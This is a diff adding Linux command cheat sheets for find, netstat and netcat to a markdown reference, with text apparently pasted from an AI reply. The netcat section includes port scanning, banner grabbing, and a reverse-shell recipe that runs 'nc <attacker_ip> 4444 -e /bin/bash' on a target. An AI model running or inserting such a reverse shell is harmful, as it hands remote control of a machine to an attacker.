@@ -653,6 +653,308 @@ git log | less
 | `more`  | Top → bottom | ✅      | Limited | Legacy pager, line-by-line   |
 | `less`  | Both         | ✅      | ✅       | Modern pager, scroll, search |
 
+---
+
+Sure! Here's a **comprehensive `find` cheat sheet**, structured in a practical, workflow-style format.
+
+---
+
+# `find` CHEAT SHEET (Search Files & Directories by Attributes)
+
+> `find` recursively searches for files and directories starting from a given path and filters based on criteria like name, size, type, time, etc.
+
+---
+
+### 📌 Basic Syntax
+
+```bash
+find [path] [options] [expression]
+```
+
+Example:
+
+```bash
+find . -name "*.txt"
+```
+
+---
+
+
+### 📌 FILE NAME FILTERING
+
+```bash
+find . -name "file.txt"              # Exact name
+find . -iname "file.txt"             # Case-insensitive
+find . -name "*.log"                 # All .log files
+find . -not -name "*.txt"            # Exclude .txt files
+```
+
+---
+
+
+### 📌 DIRECTORY-LEVEL CONTROL
+
+```bash
+find /var/log -type d                # Only directories
+find . -maxdepth 2 -name "*.sh"      # Limit depth to 2 levels
+find . -mindepth 1 -maxdepth 3       # Between 1 and 3 levels deep
+```
+
+---
+
+
+### 📌 TIME-BASED SEARCH
+
+```bash
+find . -mtime -1                     # Modified < 1 day ago
+find . -mtime +7                     # Modified > 7 days ago
+find . -atime -2                     # Accessed < 2 days ago
+find . -ctime -1                     # Status changed < 1 day ago
+
+# By minutes instead of days
+find . -mmin -30                     # Modified in last 30 mins
+```
+
+---
+
+
+### 📌 SIZE FILTERING
+
+```bash
+find . -size +100M                   # Files > 100MB
+find . -size -500k                   # Files < 500KB
+find . -size 0                       # Empty files
+```
+
+---
+
+### 📌 PERMISSIONS AND OWNERSHIP
+
+```bash
+find . -user zuhayr                  # Files owned by user
+find . -group admin                  # Files owned by group
+find . -perm 644                     # Exact permissions
+find . -perm -u+x                    # User has execute permission
+```
+
+---
+
+### 📌 EXECUTE ACTIONS ON RESULTS
+
+### Delete Files
+
+```bash
+find . -name "*.tmp" -delete         # Delete matching files
+```
+
+
+### 📌 Execute a Command
+
+```bash
+find . -name "*.log" -exec rm {} \;        # Delete .log files
+find . -type f -exec chmod 644 {} \;       # Change permissions
+find . -type f -exec md5sum {} \;          # Generate hashes
+```
+
+---
+
+### 📌 NULL-SAFE (SAFER WITH FILENAMES WITH SPACES)
+
+```bash
+find . -type f -print0 | xargs -0 rm       # Safer delete
+```
+
+---
+
+
+### 📌 COMBINING CONDITIONS
+
+```bash
+find . -type f -name "*.sh" -size +1k      # Shell scripts > 1KB
+find . \( -name "*.c" -o -name "*.h" \)    # .c or .h files
+find . ! -name "*.txt"                     # Not txt files
+```
+
+---
+
+
+### 📌 TEST EXAMPLES
+
+#### Find Broken Symlinks
+
+```bash
+find . -xtype l
+```
+
+#### Find Executables
+
+```bash
+find . -type f -executable
+```
+
+#### Find Files Modified Today
+
+```bash
+find . -mtime 0
+```
+
+---
+
+
+### 📌 OUTPUT CONTROL
+
+```bash
+find . -ls                         # Like `ls -l` output
+find . -printf "%p %k KB\n"       # Custom output (not portable on macOS)
+```
+
+---
+
+
+# `netstat` CHEAT SHEET (Network Status & Sockets)
+
+> `netstat` is used to display network connections, routing tables, interface stats, and more.
+> *Note: Deprecated on some systems in favor of `ss`.*
+
+### 📌 Basic Usage
+
+```bash
+netstat                        # Show all active connections
+netstat -tuln                  # TCP/UDP ports in listening mode (numeric)
+netstat -plnt                  # Include PID and program name
+```
+
+### 📌 Common Flags
+
+| Flag | Meaning                       |
+| ---- | ----------------------------- |
+| `-t` | TCP connections               |
+| `-u` | UDP connections               |
+| `-l` | Listening ports only          |
+| `-n` | Show numeric addresses/ports  |
+| `-p` | Show process name/PID         |
+| `-a` | All connections and listening |
+| `-r` | Show routing table            |
+| `-i` | Interface statistics          |
+| `-s` | Protocol stats                |
+
+### 📌 Examples
+
+```bash
+netstat -anp | grep 8080        # Who’s using port 8080
+netstat -r                      # View routing table
+netstat -ie                     # Interface info
+```
+
+---
+
+# 🛠️ `netcat` (`nc`) CHEAT SHEET (Swiss Army Knife of Networking)
+
+> `nc` is a versatile tool for connecting to, listening on, or transferring data between machines.
+
+---
+
+## ✅ Basic Client Usage
+
+```bash
+nc <host> <port>
+nc google.com 80
+```
+
+Then you can manually send:
+
+```
+GET / HTTP/1.1
+Host: google.com
+```
+
+---
+
+## 📡 Basic Server Usage
+
+```bash
+nc -l -p 1234                    # Listen on port 1234 (IPv4)
+nc -l 1234                       # Same, newer syntax
+```
+
+---
+
+## 📂 Send a File over Network
+
+### On Server (Receiver):
+
+```bash
+nc -l 1234 > received.txt
+```
+
+### On Client (Sender):
+
+```bash
+nc <server_ip> 1234 < file.txt
+```
+
+---
+
+## 🔁 Chat Between Two Hosts
+
+### On Host A:
+
+```bash
+nc -l 8888
+```
+
+### On Host B:
+
+```bash
+nc <hostA_ip> 8888
+```
+
+You can now type messages back and forth.
+
+---
+
+## 🔍 Port Scanning
+
+```bash
+nc -zv localhost 20-80          # Scan ports 20 to 80
+```
+
+| Flag | Meaning              |
+| ---- | -------------------- |
+| `-z` | Zero-I/O (just scan) |
+| `-v` | Verbose output       |
+| `-n` | No DNS resolution    |
+
+---
+
+## 🧪 Banner Grabbing
+
+```bash
+nc scanme.nmap.org 80
+# Then type: HEAD / HTTP/1.0 + [Enter][Enter]
+```
+
+---
+
+## 🧰 Reverse Shell (⚠️ Educational Use Only)
+
+### On Attacker/Listener:
+
+```bash
+nc -l -p 4444
+```
+
+### On Target:
+
+```bash
+nc <attacker_ip> 4444 -e /bin/bash
+```
+
+> `-e` is not supported on all versions. Use `socat` or other methods for modern systems.
+
+
+
+
 
 
 
